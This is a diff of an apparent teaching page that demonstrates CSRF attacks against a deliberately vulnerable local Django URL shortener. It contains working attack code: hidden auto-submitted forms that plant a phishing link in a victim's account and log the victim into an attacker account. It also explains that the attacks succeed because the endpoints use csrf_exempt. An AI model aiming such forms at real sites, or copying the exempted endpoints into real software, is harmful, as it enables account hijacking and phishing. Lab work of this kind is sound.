@@ -55,84 +55,139 @@
     <p>This page demonstrates CSRF attacks against the vulnerable URL shortener.</p>
     
     <div class="form-container">
-        <h3>Attack #1: Login CSRF (Session Fixation)</h3>
-        <p>Logs victim into attacker's account:</p>
-        
-        <form id="loginCsrfForm" action="http://127.0.0.1:8000/login/" method="post" target="hiddenFrame1">
-            <input type="hidden" name="username" value="attacker">
-            <input type="hidden" name="password" value="k(%$mt4NskB2RX2g">
-        </form>
-        
-        <iframe name="hiddenFrame1" style="display:none;"></iframe>
-        <button onclick="submitLoginAttack()">Execute Login Attack</button>
-        <div id="loginStatus" class="status" style="display: none;"></div>
-    </div>
-    
-    <div class="form-container">
-        <h3>Attack #2: URL Creation CSRF</h3>
+        <h3>Attack #1: URL Creation CSRF</h3>
         <p>Creates malicious URL in victim's account:</p>
         
-        <form id="urlCsrfForm" action="http://127.0.0.1:8000/shorten/" method="post" target="hiddenFrame2">
+        <form id="urlCsrfForm" action="http://localhost:8000/shorten/" method="post" target="hiddenFrame2">
             <input type="hidden" name="url" value="http://malicious-phishing-site.com/steal-credentials">
             <input type="hidden" name="notes" value="Malicious URL created via CSRF attack">
         </form>
         
-        <iframe name="hiddenFrame2" style="display:none;"></iframe>
+        <iframe name="hiddenFrame2" style="display:none;" onload="handleIframeLoad()"></iframe>
         <button onclick="submitUrlAttack()">Execute URL Attack</button>
         <div id="urlStatus" class="status" style="display: none;"></div>
+        <p><em>This will create a malicious URL in the currently logged-in user's account</em></p>
     </div>
+    
+    <div class="form-container">
+        <h3>Attack #2: Login CSRF (Session Fixation)</h3>
+        <p>Logs victim into attacker's account:</p>
+        
+        <form id="loginCsrfForm" action="http://localhost:8000/login/" method="post" target="hiddenFrame1">
+            <input type="hidden" name="username" value="attacker">
+            <input type="hidden" name="password" value="password123">
+        </form>
+        
+        <iframe name="hiddenFrame1" style="display:none;" onload="handleLoginIframeLoad()"></iframe>
+        <button onclick="submitLoginAttack()">Execute Login Attack</button>
+        <div id="loginStatus" class="status" style="display: none;"></div>
+        <p><em>This will log you into the main app as "attacker" without leaving this page</em></p>
+    </div>
+
+    <div class="instructions">
+        <h3>How to Test:</h3>
+        
+        <h4>Setup:</h4>
+        <ol>
+            <li>Open <a href="http://localhost:8000" target="_blank">the shortener app</a> in a new tab and log in</li>
+            <li>Keep both tabs open</li>
+        </ol>
+        
+        <h4>Attack #1 - URL Creation:</h4>
+        <ol>
+            <li>Click "Execute URL Attack" above</li>
+            <li>Check <a href="http://localhost:8000/my-urls/" target="_blank">"My URLs"</a> in the shortener tab to see the malicious URL</li>
+        </ol>
+        
+        <h4>Attack #2 - Login/Session Fixation:</h4>
+        <ol>
+            <li>Click "Execute Login Attack"</li>
+            <li>Refresh the shortener tab to confirm you're logged in as "attacker"</li>
+        </ol>
         
         <h3>Why This Works:</h3>
         <ul>
-            <li>Login and URL creation endpoints have <code>@csrf_exempt</code></li>
-            <li>Search endpoint uses raw SQL queries vulnerable to injection</li>
-            <li>No CSRF token validation or SQL parameterization</li>
-            <li>The browser automatically includes session cookies in cross-origin requests</li>
-            <li>The server trusts any request that comes with valid authentication</li>
+            <li>Endpoints lack CSRF protection (<code>@csrf_exempt</code>)</li>
+            <li>Browser automatically sends authentication cookies with cross-origin requests</li>
+            <li>Server trusts any request with valid cookies</li>
         </ul>
-        
-        <h3>How to Test:</h3>
-        <ol>
-            <li>First, create the attacker account: Go to <a href="http://127.0.0.1:8000/admin/" target="_blank">Django Admin</a> and create user "attacker" with password "k(%$mt4NskB2RX2g"</li>
-            <li>Open <a href="http://127.0.0.1:8000" target="_blank">the vulnerable URL shortener</a> in another tab</li>
-            <li>Come back to this page and click the attack buttons</li>
-            <li>Check if the login worked and if malicious URLs were created</li>
-        </ol>
+    </div>
+
     <script>
+        function submitUrlAttack() {
+            console.log('Executing URL creation CSRF attack...');
+            attackSubmitted = true;
+            
+            const status = document.getElementById('urlStatus');
+            status.style.display = 'block';
+            status.className = 'status warning';
+            status.innerHTML = 'Submitting attack... Please wait...';
+            
+            // Submit the form to hidden iframe
+            document.getElementById('urlCsrfForm').submit();
+            
+            // Show success message after a delay to allow form submission
+            setTimeout(() => {
+                if (attackSubmitted) { // Still submitted, iframe didn't load
+                    status.className = 'status success';
+                    status.innerHTML = 'Attack submitted! Check <a href="http://localhost:8000/my-urls/" target="_blank">My URLs</a> to verify if the malicious URL was created.';
+                    attackSubmitted = false;
+                }
+            }, 3000);
+        }
+        
+        let attackSubmitted = false;
+        
+        function handleIframeLoad() {
+            if (attackSubmitted) {
+                console.log('Form submission completed');
+                const status = document.getElementById('urlStatus');
+                status.className = 'status success';
+                status.innerHTML = 'Attack completed! Check <a href="http://localhost:8000/my-urls/" target="_blank">My URLs</a> to see if the malicious URL was created.';
+                attackSubmitted = false;
+            }
+        }
+        
+        let loginAttackSubmitted = false;
+        
         function submitLoginAttack() {
             console.log('Executing login CSRF attack...');
-            document.getElementById('loginCsrfForm').submit();
+            loginAttackSubmitted = true;
             
             const status = document.getElementById('loginStatus');
             status.style.display = 'block';
             status.className = 'status warning';
-            status.innerHTML = 'Attack submitted! Check main app tab for login as "attacker"';
+            status.innerHTML = 'Submitting login attack... Please wait...';
             
-            setTimeout(checkLoginStatus, 1000);
+            // Submit the form to hidden iframe
+            document.getElementById('loginCsrfForm').submit();
+            
+            // Show success message after a delay and check login status
+            setTimeout(() => {
+                if (loginAttackSubmitted) { // Still submitted, iframe didn't load
+                    status.className = 'status success';
+                    status.innerHTML = 'Login attack submitted! Checking if you\'re now logged in as "attacker"...';
+                    loginAttackSubmitted = false;
+                    // Check login status after a short delay
+                    setTimeout(checkLoginStatus, 1000);
+                }
+            }, 2000);
         }
         
-        function submitUrlAttack() {
-            console.log('Executing URL creation CSRF attack...');
-            document.getElementById('urlCsrfForm').submit();
-            
-            const status = document.getElementById('urlStatus');
-            status.style.display = 'block';
-            status.className = 'status success';
-            status.innerHTML = 'Malicious URL created! Check <a href="http://127.0.0.1:8000/my-urls/" target="_blank">My URLs</a>';
-        }
-        
-        function submitSqlInjectionAttack() {
-            console.log('Executing SQL injection attack...');
-            document.getElementById('sqlInjectionForm').submit();
-            
-            const status = document.getElementById('sqlStatus');
-            status.style.display = 'block';
-            status.className = 'status success';
-            status.innerHTML = 'SQL injection executed! Search for "HACK" on main site';
+        function handleLoginIframeLoad() {
+            if (loginAttackSubmitted) {
+                console.log('Login form submission completed');
+                const status = document.getElementById('loginStatus');
+                status.className = 'status success';
+                status.innerHTML = 'Login attack completed! Checking if you\'re now logged in as "attacker"...';
+                loginAttackSubmitted = false;
+                // Check login status after iframe loads
+                setTimeout(checkLoginStatus, 1000);
+            }
         }
         
         function checkLoginStatus() {
-            fetch('http://127.0.0.1:8000/', {
+            fetch('http://localhost:8000/', {
                 method: 'GET',
                 credentials: 'include'
             })
